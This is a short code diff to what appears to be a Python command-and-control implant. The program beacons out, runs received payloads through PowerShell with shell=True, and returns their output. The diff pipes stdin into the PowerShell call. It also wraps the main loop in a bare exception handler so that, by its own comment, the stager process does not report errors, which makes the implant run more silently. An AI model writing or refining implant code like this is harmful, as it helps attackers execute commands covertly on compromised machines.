@@ -86,7 +86,7 @@ def handle_commands(response, identifier):
 
 				command_output = file.execute_command()
 			else:
-				result = subprocess.run([r"powershell.exe", save_path], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+				result = subprocess.run([r"powershell.exe", save_path], stdin=subprocess.PIPE , stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
 				command_output = result.stdout.decode('utf-8')
 
 
@@ -130,4 +130,8 @@ def main():
 		beacon(identifier)
 
 if __name__=="__main__":
-	main()
+	try:
+		main()
+	except:
+		## So that the stager process doesn't complain in case of any error
+		pass
